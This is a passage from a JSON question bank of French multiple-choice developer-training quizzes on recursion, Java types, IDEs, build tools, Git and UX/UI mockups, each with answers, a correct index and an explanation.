            "explanation": "La récursion est un concept en programmation où une fonction s'appelle elle-même pour résoudre un problème.\nLa récursion est souvent utilisée pour simplifier des problèmes complexes en les décomposant en sous-problèmes plus simples.\nIl existe deux types de récursion :\n\t- La Récursion directe où une fonction s'appelle elle-même.\n\t- La Récursion indirecte où deux ou plusieurs fonctions s'appellent mutuellement.\n\nExemple de récursion directe avec la suite de Fibonacci :\ndef fibonacci(n):\n    if n <= 1:\n        return n\n    else:\n        return fibonacci(n-1) + fibonacci(n-2)\n\n# Exemple d'utilisation\nn = 10\nprint('Le', n, 'ème nombre de Fibonacci est :', fibonacci(n)) \nExemple de récursion indirecte avec deux fonctions qui s'appellent l'une l'autre :\ndef fonction_a(n):\n    if n > 0:\n        print('Fonction A, n =', n)\n        fonction_b(n - 1)\n\ndef fonction_b(n):\n    if n > 0:\n        print('Fonction B, n =', n)\n        fonction_a(n - 1)\n\n# Exemple d'utilisation\nfonction_a(3)\n\n# Affiche :\n# Fonction A, n = 3\n# Fonction B, n = 2\n# Fonction A, n = 1"
        },
        {
            "theme": "Algorithmes",
            "question": "Quelles sont les différences entre les types primitifs et types par référence en Java ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Les types primitifs peuvent contenir plusieurs valeurs simultanément contrairement aux types par référence",
                "Les types par référence sont automatiquement convertis en types primitifs lors de l’exécution",
                "Les types primitifs en Java représentent des valeurs élémentaires telles que les entiers, les flottants, les caractères et les booléens",
                "Les types primitifs sont uniquement utilisés dans les interfaces graphiques tandis que les types par référence sont utilisés dans la logique métier"
            ],
            "correct": 2,
            "explanation": "Les types primitifs en Java représentent des valeurs élémentaires telles que les entiers, les flottants, les caractères et les booléens.\nIls sont stockés directement en mémoire (sur la pile) et ne possèdent pas de méthodes ou d'attributs associés.\nOn peut citer les exemples de int , double , char , et boolean .\nLes types par référence , en revanche, représentent des objets complexes.\nIls sont stockés dans le tas (heap) et sont référencés par une adresse mémoire.\nContrairement aux types primitifs, les types par référence peuvent avoir des méthodes et des attributs.\nOn peut citer les exemples de String , Date , et ArrayList.\nTableau d'association types primitifs / classes enveloppes :\n| Type primitif | Classe enveloppe |\n|---------------|------------------|\n| byte          | Byte             |\n| short         | Short            |\n| int           | Integer          |\n| long          | Long             |\n| float         | Float            |\n| double        | Double           |\n| char          | Character        |\n| boolean       | Boolean          |"
        }
    ],
    "Les IDE": [
        {
            "theme": "Les IDE",
            "question": "Qu'est-ce qu'un environnement de développement intégré (IDE) ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un simple éditeur de texte",
                "Un logiciel qui fournit des outils complets (éditeur, compilateur, débogueur, gestion de projet)",
                "Un gestionnaire de fichiers",
                "Un navigateur web spécialisé"
            ],
            "correct": 1,
            "explanation": "Un IDE combine un éditeur de code, un compilateur/interpréteur, un débogueur et des outils de gestion de projet.\nIl facilite le développement avec des fonctionnalités comme l’autocomplétion et l’intégration Git."
        },
        {
            "theme": "Les IDE",
            "question": "Citez des IDE couramment utilisés.",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Notepad, Paint, Chrome",
                "JetBrains (IntelliJ IDEA, WebStorm, PyCharm, PHPStorm), VS Code, Eclipse, NetBeans",
                "Google Docs et Excel",
                "Uniquement Visual Studio"
            ],
            "correct": 1,
            "explanation": "Les IDE populaires incluent la suite JetBrains, Visual Studio Code, Eclipse et NetBeans.\nChacun est adapté à différents langages."
        },
        {
            "theme": "Les IDE",
            "question": "Quelles sont les principales fonctionnalités dans un IDE ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Uniquement écrire du texte",
                "Complétion de code, débogage, gestion de versions, support multi-langage, tests intégrés",
                "Lecture de PDF",
                "Exécution de scripts sans écrire de code"
            ],
            "correct": 1,
            "explanation": "Un IDE moderne intègre des outils de complétion, débogage, gestion Git, support multi-langage, tests et extensions."
        },
        {
            "theme": "Les IDE",
            "question": "Quelles extensions pouvez-vous utiliser dans VSC ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un simple éditeur de texte sans compilation",
                "Prettier, ESLint, Live Server",
                "Un tableur pour gérer le code",
                "Un navigateur spécialisé pour développeurs"
            ],
            "correct": 1,
            "explanation": "Voici quelques plugins et extensions recommandés.\n\t- Prettier est un formateur de code qui assure une mise en forme cohérente du code.\n\t- ESLint est linter pour JavaScript qui aide à identifier et à corriger les problèmes de code.\n\t- Live Server permet de lancer un serveur local avec rechargement à chaud pour les projets web.\n\t- GitLens améliore les capacités de Git dans l'IDE en fournissant des informations sur les commits et les auteurs.\n\t- Emmet accélère le processus d'écriture de code HTML et CSS."
        },
        {
            "theme": "Les IDE",
            "question": "Qu'est-ce qu'Emmet ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Un navigateur spécialisé pour développeurs",
                "Emmet est un outil de productivité pour les développeurs web qui permet d'écrire du code HTML et CSS de manière plus rapide et efficace",
                "Un tableur pour gérer le code",
                "Un simple éditeur de texte sans compilation"
            ],
            "correct": 1,
            "explanation": "Emmet est un outil de productivité pour les développeurs web qui permet d'écrire du code HTML et CSS de manière plus rapide et efficace.\nGrâce à sa syntaxe abrégée, les utilisateurs peuvent générer des blocs de code complexes en utilisant des raccourcis simples, ce qui réduit considérablement le temps de développement.\nEmmet s'intègre facilement dans de nombreux éditeurs de code et IDE, tels que Visual Studio Code, et Sublime Text, et offre des fonctionnalités comme l'expansion de snippets, la complétion automatique et la navigation rapide dans le code, rendant ainsi le processus de codage plus fluide et agréable."
        },
        {
            "theme": "Les IDE",
            "question": "Qu'est-ce qu'un gestionnaire de paquets ? Donnez des exemples.",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Un tableur pour gérer le code",
                "Un gestionnaire de paquets est un outil qui automatise l'installation, la mise à jour et la gestion des dépendances d'un projet",
                "Un simple éditeur de texte sans compilation",
                "Un navigateur spécialisé pour développeurs"
            ],
            "correct": 1,
            "explanation": "Un gestionnaire de paquets est un outil qui automatise l'installation, la mise à jour et la gestion des dépendances d'un projet.\n\t- npm (Node Package Manager) est utilisé pour gérer les paquets JavaScript.\n\t- Yarn est un gestionnaire de paquets alternatif pour JavaScript, plus rapide et avec des fonctionnalités avancées.\n\t- Composer permet de gérer les dépendances en PHP."
        },
        {
            "theme": "Les IDE",
            "question": "Qu'est-ce qu'un outil de gestion de tâches ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Un navigateur spécialisé pour développeurs",
                "Un outil de gestion de tâches est un logiciel qui automatise les tâches répétitives dans le processus de développement, permettant ainsi aux développeurs de se concentrer sur des tâches plus créatives et stratégiques",
                "Un tableur pour gérer le code",
                "Un simple éditeur de texte sans compilation"
            ],
            "correct": 1,
            "explanation": "Un outil de gestion de tâches est un logiciel qui automatise les tâches répétitives dans le processus de développement, permettant ainsi aux développeurs de se concentrer sur des tâches plus créatives et stratégiques.\nCes outils facilitent des opérations telles que la compilation de fichiers, la minification, le bundling et l'optimisation des ressources.\nParmi les outils de gestion de tâches les plus populaires, on trouve Webpack , Vite , Esbuild , Rollup et Parcel.\nChacun de ces outils offre des fonctionnalités spécifiques adaptées à différents types de projets, améliorant ainsi l'efficacité et la productivité des équipes de développement."
        },
        {
            "theme": "Les IDE",
            "question": "Qu'est-ce que Webpack ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Webpack est un module bundler open-source pour JavaScript, conçu pour gérer et optimiser les ressources d'applications web modernes",
                "Un tableur pour gérer le code",
                "Un navigateur spécialisé pour développeurs",
                "Un simple éditeur de texte sans compilation"
            ],
            "correct": 0,
            "explanation": "Webpack est un module bundler open-source pour JavaScript, conçu pour gérer et optimiser les ressources d'applications web modernes.\nIl permet de regrouper les JS, le CSS, les images et le HTML en un ou plusieurs bundles statiques, facilitant ainsi leur chargement par le navigateur. Webpack fonctionne sur le principe de modules et de dépendances, créant un graphique de dépendances qui permet aux développeurs d'utiliser une approche modulaire dans le développement de leurs applications.\nGrâce à un fichier de configuration, `webpack.config.js`, les développeurs peuvent définir des règles, des plugins et des tâches personnalisées pour le processus de bundling.\nL'un des principaux avantages de Webpack est sa capacité à effectuer le code splitting (ou division de code), ce qui permet de charger uniquement les parties nécessaires d'une application, améliorant ainsi les performances et l'expérience utilisateur.\nDe plus, il propose un serveur de développement intégré avec le `hot module replacement` (HMR), permettant de mettre à jour le code sans recharger la page."
        },
        {
            "theme": "Les IDE",
            "question": "Qu'est-ce que Gulp ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Un navigateur spécialisé pour développeurs",
                "Gulp est un outil d'automatisation des tâches de construction (task runner) basé sur Node",
                "Un simple éditeur de texte sans compilation",
                "Un tableur pour gérer le code"
            ],
            "correct": 1,
            "explanation": "Gulp est un outil d'automatisation des tâches de construction (task runner) basé sur Node.js.\nIl permet d'automatiser et d'optimiser les étapes répétitives du workflow de développement web, comme la minification, la concaténation, les tests unitaires, l'optimisation des images, etc.\n\nGulp fonctionne sur le principe de pipelines.\nVous définissez des tâches qui prennent des fichiers en entrée, appliquent une série de transformations à l'aide de plugins, puis écrivent les fichiers résultants à un endroit spécifié.\n\nPar exemple, une tâche pourrait récupérer tous les fichiers Sass, les compiler en CSS, ajouter les préfixes vendeurs, puis écrire le CSS final dans un dossier de distribution.\nL'avantage de Gulp est qu'il vous permet d'automatiser ces tâches répétitives et chronophages, vous faisant gagner un temps précieux.\nDe plus, en définissant ces étapes dans un fichier de configuration, votre workflow devient reproductible et partageable au sein d'une équipe."
        }
    ],
    "L'environnement": [
        {
            "theme": "L'environnement",
            "question": "Comment configurer les variables d'environnement sur votre système ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "On ne peut pas configurer de variables d'environnement",
                "Uniquement via un logiciel externe",
                "Windows : via le Panneau de configuration ; macOS/Linux : dans ~/.bashrc ou ~/.bash_profile",
                "Elles se configurent directement dans le code"
            ],
            "correct": 2,
            "explanation": "Sous Windows, elles se définissent dans les paramètres système avancés. Sous macOS/Linux, dans les fichiers de configuration du shell."
        },
        {
            "theme": "L'environnement",
            "question": "Qu'est-ce qu'un serveur web local ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un serveur installé sur une machine distante",
                "Un logiciel qui simule un serveur web sur votre ordinateur pour tester vos applications",
                "Un hébergeur gratuit en ligne",
                "Un service cloud obligatoire"
            ],
            "correct": 1,
            "explanation": "Un serveur web local permet de tester des applications web sur sa machine (ex : WAMP, MAMP, XAMPP, ou Live Server de VS Code)."
        }
    ],
    "Le versioning": [
        {
            "theme": "Le versioning",
            "question": "Qu'est-ce qu'un logiciel de versioning et pourquoi est-il important ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un logiciel qui fait des sauvegardes automatiques",
                "Un outil qui gère les différentes versions de fichiers et facilite la collaboration",
                "Un programme pour compiler du code",
                "Un système de chat pour développeurs"
            ],
            "correct": 1,
            "explanation": "Le versioning (Git, SVN, etc.) permet de suivre les modifications, revenir en arrière, travailler en équipe et gérer les conflits."
        },
        {
            "theme": "Le versioning",
            "question": "Comment installer Git sur votre système ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Télécharger depuis git-scm.com et suivre les instructions selon l’OS",
                "Il est déjà installé sur tous les PC",
                "Depuis le Microsoft Store uniquement",
                "Uniquement via Docker"
            ],
            "correct": 0,
            "explanation": "On télécharge Git sur git-scm.com, on installe selon l’OS, puis on vérifie avec `git --version`."
        },
        {
            "theme": "Le versioning",
            "question": "Comment installer Git sur votre système d'exploitation ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "C'est installé par défaut sur toutes les machines",
                "Installer Docker Desktop",
                "Installer obligatoirement Linux",
                "Pour installer Git sur votre système d'exploitation :\n- Téléchargez la dernière version de Git depuis le site officiel : https://git-scm"
            ],
            "correct": 3,
            "explanation": "Pour installer Git sur votre système d'exploitation :\n\t- Téléchargez la dernière version de Git depuis le site officiel : https://git-scm.com/downloads.\n\t- Suivez les instructions d'installation spécifiques à votre système (Windows, macOS, Linux).\n\t- Une fois installé, vous pouvez vérifier l'installation en exécutant :\n`git --version`\ndans le terminal."
        },
        {
            "theme": "Le versioning",
            "question": "Comment configurer Git avec vos informations personnelles ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "C'est impossible",
                "il faut le configurer dans le fichier de conf du serveur web",
                "Pour configurer Git avec vos informations personnelles, vous pouvez exécuter les commandes suivantes dans le terminal :\n git config --global user",
                "Pour configurer Git avec vos informations personnelles, vous pouvez exécuter les commandes suivantes dans le terminal :\n git perso --global user"
            ],
            "correct": 2,
            "explanation": "Pour configurer Git avec vos informations personnelles, vous pouvez exécuter les commandes suivantes dans le terminal:\ngit config --global user.name \"Votre Nom\"\ngit config --global user.email \"votre_email@example.com\""
        },
        {
            "theme": "Le versioning",
            "question": "Quels sont les avantages d'utiliser un gestionnaire de versions comme Git ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Git permet de suivre les modifications, avoir un historique. Faire de la collaboration, Gérer les conflits, la sécurité et la portabilité.",
                "Git permet de compiler automatiquement le code sans avoir besoin d’un environnement de développement installé sur la machine.",
                "L’utilisation de Git garantit qu’aucune erreur ne peut être commise dans le code, car chaque commit est automatiquement validé par le système.",
                "Git sert principalement à crypter les fichiers du projet afin d’en sécuriser l’accès pendant le développement collaboratif."
            ],
            "correct": 0,
            "explanation": "Utiliser un gestionnaire de versions comme Git offre de nombreux avantages pour le développement de projets logiciels.\n\t- Le suivi des modifications : Git permet de suivre l'historique complet des changements apportés aux fichiers, facilitant la compréhension de l'évolution du projet et permettant de revenir à des versions antérieures si nécessaire.\n\t- La collaboration : Git facilite grandement la collaboration entre développeurs en permettant à plusieurs personnes de travailler simultanément sur le même projet.\nLes modifications de chacun sont enregistrées et peuvent être fusionnées sans conflits.\n\t- Les branches : Git encourage une approche de développement fondée sur les branches.\nLes développeurs peuvent en créer pour développer de nouvelles fonctionnalités ou corriger des bugs sans affecter le code principal.\nCelles-ci peuvent ensuite être fusionnées une fois le travail terminé.\n\t- La sécurité : Git offre une sécurité robuste avec son système de hachage cryptographique, garantissant l'intégrité du code source et empêchant toute modification non autorisée.\n\t- La portabilité : Les dépôts Git sont portables et peuvent être clonés sur différentes machines, permettant aux développeurs de travailler sur le projet depuis n'importe où."
        },
        {
            "theme": "Le versioning",
            "question": "Quelle est la différence entre Git, GitHub et GitLab ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Git est une interface graphique permettant de gérer des dépôts hébergés sur GitHub et GitLab, qui sont des langages de programmation orientés versioning.",
                "Git est un système de contrôle de version distribué qui fonctionne localement sur votre machine",
                "GitHub et GitLab sont des extensions payantes de Git destinées uniquement au stockage de fichiers volumineux dans le cloud.",
                "Git est un service en ligne, tandis que GitHub et GitLab sont des outils installés localement sur l’ordinateur pour exécuter des commandes Git."
            ],
            "correct": 1,
            "explanation": "- Git est un système de contrôle de version distribué qui fonctionne localement sur votre machine.\nIl permet de suivre les modifications apportées au code source et de gérer l'historique des fichiers.\n\n- GitHub est une plateforme d'hébergement de dépôts Git qui permet de stocker et de partager des projets en ligne.\nElle offre des outils de gestion de projet.\n\n- GitLab est également une plateforme d'hébergement, mais elle se concentre sur l'intégration continue (CI/CD) et offre des fonctionnalités de gestion de projet plus avancées, tout en étant open source pour son édition Community."
        },
        {
            "theme": "Le versioning",
            "question": "Comment cloner un dépôt Git existant sur votre machine locale ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "En copiant simplement l’URL du dépôt et en la collant dans le navigateur pour télécharger un fichier ZIP du projet.",
                "En créant un nouveau dépôt vide sur votre ordinateur et en important manuellement tous les fichiers du projet via l’explorateur de fichiers.",
                "En utilisant la commande git start clone suivie du nom du projet, ce qui crée automatiquement un dépôt distant et local synchronisé.",
                "Pour cloner un dépôt Git existant, vous pouvez utilisez la commande suivante dans le terminal :\ngit clone https://url_du_depot"
            ],
            "correct": 3,
            "explanation": "Pour cloner un dépôt Git existant, vous pouvez utilisez la commande suivante dans le terminal :\ngit clone https://url_du_depot.git"
        },
        {
            "theme": "Le versioning",
            "question": "Comment résoudre un conflit de fusion dans Git ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Pour résoudre un conflit de fusion dans Git :\n - Identifiez les fichiers en conflit en utilisant `git status`",
                "En supprimant entièrement le fichier en conflit et en le recréant à partir de zéro pour éviter toute confusion.",
                "En exécutant la commande git merge --force qui résout automatiquement tous les conflits sans intervention de l’utilisateur.",
                "En modifiant l’historique du dépôt avec git reset --hard pour revenir à une version antérieure et ignorer le conflit."
            ],
            "correct": 0,
            "explanation": "Pour résoudre un conflit de fusion dans Git :\n\t- Identifiez les fichiers en conflit en utilisant `git status`.\n\t- Ouvrez les fichiers en conflit et modifiez-les pour résoudre les conflits.\n\t- Une fois résolus, ajoutez les fichiers avec `git add &lt;fichier>` et terminez la fusion avec `git commit`."
        },
        {
            "theme": "Le versioning",
            "question": "Expliquez le concept de branches dans Git",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Une branche dans Git est une copie complète et indépendante du dépôt qui nécessite de dupliquer tous les fichiers sur le disque dur pour chaque branche.",
                "Les branches sont utilisées pour bloquer certaines parties du code afin que seuls certains utilisateurs puissent y accéder, comme un système de permissions.",
                "Les branches dans Git permettent de créer des lignes de développement séparées",
                "Créer une branche fusionne automatiquement tous les commits existants du dépôt principal sans possibilité de modifications séparées."
            ],
            "correct": 2,
            "explanation": "Les branches dans Git permettent de créer des lignes de développement séparées.\nCela permet de travailler sur des fonctionnalités ou des corrections sans affecter le code principal.\nLes branches peuvent être fusionnées une fois le travail terminé."
        },
        {
            "theme": "Le versioning",
            "question": "Qu'est-ce qu'un fichier .gitignore et à quoi sert-il ? Comment le créer ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un fichier .gitignore est un fichier spécial qui contient tous les commits que Git doit supprimer automatiquement du dépôt.",
                "Le fichier .gitignore sert à stocker une copie locale de tous les fichiers du dépôt pour éviter de les télécharger depuis le serveur",
                "On crée un fichier .gitignore en enregistrant une liste des utilisateurs autorisés à accéder au dépôt, afin de restreindre les droits d’écriture.",
                "Un fichier qui indique à Git quels fichiers ou répertoires ignorer dans un projet."
            ],
            "correct": 3,
            "explanation": "Un fichier .gitignore est un fichier qui indique à Git quels fichiers ou répertoires ignorer dans un projet.\nPour créer un fichier .gitignore :\n\t- Créez un fichier nommé .gitignore à la racine de votre dépôt.\n\t- Ajoutez les noms de fichiers ou de répertoires à ignorer, par exemple :\nnode_modules/*.log"
        },
        {
            "theme": "Le versioning",
            "question": "Dans le cadre professionnel (ex: avec JIRA), quelle est une bonne pratique pour gérer vos branches et vos commits avec Git ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Travailler tous ensemble directement sur la branche principale (main/master) pour éviter les fusions.",
                "Développer chaque fonctionnalité sur sa propre branche nommée avec l'ID du ticket, et préfixer chaque commit par ce même ID.",
                "Créer une nouvelle branche locale par jour et envoyer les commits uniquement en fin de projet par clé USB.",
                "Ne faire des commits que lorsque le projet est entièrement validé et fonctionnel en production."
            ],
            "correct": 1,
            "explanation": "Développer sur une branche dédiée par fonctionnalité (feature branch) liée à un ticket (ex: Jira) et préfixer les messages de commit avec l'identifiant du ticket permet d'assurer une traçabilité parfaite, de faciliter la revue de code (Pull Requests) et d'automatiser le suivi de projet avec des outils comme Bitbucket ou GitHub."
        },
        {
            "theme": "Le versioning",
            "question": "À quelle fréquence est-il recommandé d'effectuer des commits Git sur un projet de développement ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Uniquement une fois par semaine pour regrouper toutes les modifications.",
                "À chaque ligne de code écrite pour conserver un historique extrêmement détaillé.",
                "Au moins une fois par jour si possible, en veillant à commiter du code fonctionnel et cohérent à chaque étape logique.",
                "Seulement lorsque l'application passe les tests d'intégration continue sur le serveur de staging."
            ],
            "correct": 2,
            "explanation": "Il est conseillé de commiter régulièrement (au moins une fois par jour si possible) afin de ne pas perdre de travail et de faciliter la collaboration. Cependant, il faut veiller à ce que chaque commit représente une étape logique et contienne du code fonctionnel (qui ne casse pas le build) pour garder un historique propre et exploitable."
        }
    ],
    "Les maquettes": [
        {
            "theme": "Les maquettes",
            "question": "Qu'est-ce que l'UX et l'UI et quelles sont les différences ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "L'UX concerne uniquement les couleurs et l'esthétique, tandis que l'UI gère la navigation et la structure du site",
                "L'UX est un langage de programmation utilisé pour le design d'interface, et l'UI est une méthode de test d'expérience utilisateur",
                "L'UX se limite à la création de maquettes basse fidélité, et l'UI à la programmation du front-end",
                "L'UX (User Experience) et l'UI (User Interface) sont deux aspects complémentaires du design numérique"
            ],
            "correct": 3,
            "explanation": "L' UX (User Experience) et l' UI (User Interface) sont deux aspects complémentaires du design numérique.\nL'UX Design se concentre sur l'expérience globale de l'utilisateur, en analysant ses besoins et comportements, optimisant son parcours et sa satisfaction, et en travaillant sur la structure, la navigation et l'ergonomie du produit.\nL'UI Design, quant à lui, se focalise sur l'apparence visuelle de l'interface, créant les éléments graphiques et interactifs, définissant les couleurs, typographies et la mise en page, tout en assurant la cohérence visuelle et l'esthétique.\n\nBien que distincts, ces deux domaines collaborent étroitement pour créer des produits numériques à la fois fonctionnels et attrayants, l'UX s'occupant du fonctionnement global et de la satisfaction de l'utilisateur, tandis que l'UI gère l'aspect visuel et l'interaction directe avec l'interface."
        },
        {
            "theme": "Les maquettes",
            "question": "Comment créer des maquettes ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Il suffit d'utiliser un logiciel de traitement de texte et d’ajouter des captures d’écran du site final",
                "Pour créer des maquettes efficacement, il faut suivre plusieurs étapes :\n - clarifier le but et les objectifs du projet;\n - comprendre le public cible et les tendances du marché;\n - créer des wireframes et établir la structure de base;\n - élaborer des maquettes détaillées avec couleurs et typographie;\n - développer des versions interactives et simuler l'expérience utilisateur;\n - recueillir des retours et itérer sur le design;\n - documenter avec des guides de style et des spécifications pour les développeurs",
                "Créer des maquettes consiste à coder directement le site final pour voir à quoi il ressemble en production",
                "Faire une maquette consiste seulement à choisir les couleurs principales et à ajouter le logo sur la page d’accueil"
            ],
            "correct": 1,
            "explanation": "Pour créer des maquettes efficacement, il faut suivre plusieurs étapes :\n\t- clarifier le but et les objectifs du projet;\n\t- comprendre le public cible et les tendances du marché;\n\t- créer des wireframes et établir la structure de base ;\n\t- élaborer des maquettes détaillées avec couleurs et typographie ;\n\t- développer des versions interactives et simuler l'expérience utilisateur ;\n\t- recueillir des retours et itérer sur le design ;\n\t- documenter avec des guides de style et des spécifications pour les développeurs."
        },
        {
            "theme": "Les maquettes",
            "question": "Quels outils utiliser pour créer des maquettes ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Des outils de gestion de base de données comme MySQL ou MongoDB",
                "Voici une liste d'outils populaires pour créer des maquettes : - Figma est un outil collaboratif en ligne pour le design d'interfaces et le prototypage",
                "Un éditeur de texte comme Notepad++ ou Visual Studio Code suffit largement pour créer des maquettes",
                "Des outils d’analyse SEO comme Google Analytics ou SEMrush"
            ],
            "correct": 1,
            "explanation": "Voici une liste d'outils populaires pour créer des maquettes :\n\t- Figma est un outil collaboratif en ligne pour le design d'interfaces et le prototypage.\n\t- Adobe XD est une application de design d'expérience utilisateur pour le web et le mobile.\n\t- Sketch est un logiciel de design vectoriel pour Mac, idéal pour la conception d'interfaces.\n\t- Balsamiq est parfait pour créer rapidement des wireframes simples."
        },
        {
            "theme": "Les maquettes",
            "question": "Comment créer un schéma de flux utilisateur ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Un schéma de flux utilisateur se crée en listant simplement toutes les pages du site sans ordre logique",
                "Il suffit d’écrire le scénario utilisateur dans un document texte, sans utiliser de symboles visuels",
                "On peut créer un flux utilisateur uniquement à la fin du développement pour tester la navigation finale",
                "Pour créer un schéma de flux utilisateur efficace, suivez ces étapes :\n- Identifier l'objectif principal du flux utilisateur ;\n- Définir le point de départ et le point d'arrivée du parcours ;\n- Lister toutes les étapes intermédiaires possibles ;\n- Organiser les étapes de manière logique et chronologique ;\n- Utiliser des formes et symboles standards (rectangles pour les actions, losanges pour les décisions, etc.)"
            ],
            "correct": 3,
            "explanation": "Pour créer un schéma de flux utilisateur efficace, suivez ces étapes :\n\t- Identifier l'objectif principal du flux utilisateur;\n\t- Définir le point de départ et le point d'arrivée du parcours;\n\t- Lister toutes les étapes intermédiaires possibles;\n\t- Organiser les étapes de manière logique et chronologique;\n\t- Utiliser des formes et symboles standards (rectangles pour les actions, losanges pour les décisions, etc.);\n\t- Ajouter des flèches pour indiquer la direction du flux;\n\t- Inclure des points de décision et des chemins alternatifs;\n\t- Annoter le schéma avec des explications si nécessaire;\n\t- Simplifier le schéma autant que possible pour une meilleure lisibilité;\n\t- Valider le flux avec les parties prenantes et itérer si nécessaire."
        },
        {
            "theme": "Les maquettes",
            "question": "Comment définir les critères d'acceptation pour une fonctionnalité ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Les critères d’acceptation sont rédigés uniquement après la mise en production du projet",
                "Pour définir efficacement les critères d'acceptation d'une fonctionnalité, suivez ces étapes :\n - Comprendre clairement l'objectif et la valeur de la fonctionnalité pour l'utilisateur ;\n - Identifier les comportements attendus et les résultats souhaités ;\n - Utiliser un format clair et concis, comme la structure GIVEN-WHEN-THEN ;\n - S'assurer que les critères sont testables et mesurables ;\n - Collaborer avec l'équipe de développement et les parties prenantes ;\n - Limiter le nombre de critères ;\n - Valider les critères avant le développement.",
                "Les critères d’acceptation servent uniquement à évaluer les performances techniques du code",
                "Les critères d’acceptation doivent décrire la charte graphique et les couleurs utilisées"
            ],
            "correct": 1,
            "explanation": "Pour définir efficacement les critères d'acceptation d'une fonctionnalité, suivez ces étapes :\n\t- Comprendre clairement l'objectif et la valeur de la fonctionnalité pour l'utilisateur ;\n\t- Identifier les comportements attendus et les résultats souhaités ;\n\t- Utiliser un format clair et concis, comme la structure GIVEN-WHEN-THEN ;\n\t- Rester focalisé sur le 'quoi' plutôt que sur le 'comment' ;\n\t- S'assurer que les critères sont testables et mesurables;\n\t- Inclure à la fois les scénarios positifs et négatifs;\n\t- Collaborer avec l'équipe de développement et les parties prenantes;\n\t- Limiter le nombre de critères (idéalement entre 3 et 7);\n\t- Valider les critères avec l'équipe avant le début du développement;\n\t - Rester ouvert aux ajustements si de nouvelles informations émergent pendant le développement."
        },
        {
            "theme": "Les maquettes",
            "question": "Quelles sont les différences entre une maquette et un prototype ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "On peut identifier entre une maquette et un prototype huit différences",
                "Une maquette et un prototype sont identiques, ils désignent tous deux un produit final développé",
                "Un prototype est uniquement un dessin papier sans interactivité, tandis qu’une maquette est un modèle fonctionnel",
                "Une maquette et un prototype ne sont utilisés que dans les projets matériels, jamais en design numérique"
            ],
            "correct": 0,
            "explanation": "On peut identifier entre une maquette et un prototype huit différences.\n\t- L' objectif : une maquette vise à visualiser l'aspect et l'ergonomie, tandis qu'un prototype teste le fonctionnement et les interactions.\n\t- La fidélité : une maquette est souvent de basse fidélité, alors que un prototype est généralement de haute fidélité.\n\t- L' interactivité : une maquette est statique ou peu interactive, le prototype offre une interaction plus complète.\n\t- Le stade de développement : une maquette est utilisée plus tôt dans le processus, le prototype intervient plus tard.\n\t- Le coût et temps : une maquette est généralement moins coûteuse et plus rapide à produire que le prototype.\n\t- Le détail : une maquette se concentre sur l'apparence visuelle, le prototype inclue plus de détails fonctionnels. \n\t- L' itération : une maquette est plus facile à modifier rapidement, le prototype demande plus d'effort pour les changements. \n\t- Le test utilisateur : une maquette sert à des tests de concept, le prototype permet des tests d'utilisabilité plus approfondis."
        },
        {
            "theme": "Les maquettes",
            "question": "Comment rédiger un cahier des charges fonctionnel ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Un cahier des charges fonctionnel doit uniquement détailler les aspects techniques du développement",
                "Pour rédiger un cahier des charges fonctionnel efficace, suivez ces étapes :\n- Définir clairement l'objectif et le contexte du projet ;\n - Identifier les besoins et les fonctions attendues ;\n\t- Décrire les fonctionnalités attendues en termes de résultats mesurables ;\n\t- Inclure les contraintes techniques, réglementaires et budgétaires ;\n\t- Spécifier les critères d'acceptation pour chaque fonction ;\n\t- Utiliser un langage clair, simple et sans ambiguïté ;\n\t- Impliquer les parties prenantes dans la validation du document.",
                "Il s'agit d’un document optionnel réservé aux projets informatiques de grande ampleur uniquement",
                "Le cahier des charges fonctionnel décrit exclusivement la charte graphique et les maquettes visuelles"
            ],
            "correct": 1,
            "explanation": "Pour rédiger un cahier des charges fonctionnel efficace, suivez ces étapes :\n\t- Définir clairement l'objectif et le contexte du projet;\n\t- Réaliser une analyse fonctionnelle pour identifier les besoins et les fonctions attendues;\n\t- Structurer le document de manière logique et concise;\n\t- Décrire les fonctionnalités attendues en termes de résultats mesurables;\n\t- Hiérarchiser les fonctions (principales, secondaires, contraintes);\n\t- Inclure les contraintes techniques, réglementaires et budgétaires;\n\t- Spécifier les critères d'acceptation pour chaque fonction;\n\t- Éviter de mentionner des solutions techniques spécifiques;\n\t- Utiliser un langage clair, simple et sans ambiguïté;\n\t- Impliquer toutes les parties prenantes dans la rédaction et la validation du document."
        },
        {
            "theme": "Les maquettes",
            "question": "Comment passe-t-on des wireframes aux maquettes lors de la conception d'une interface ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "En écrivant directement le code HTML et CSS de la structure de base.",
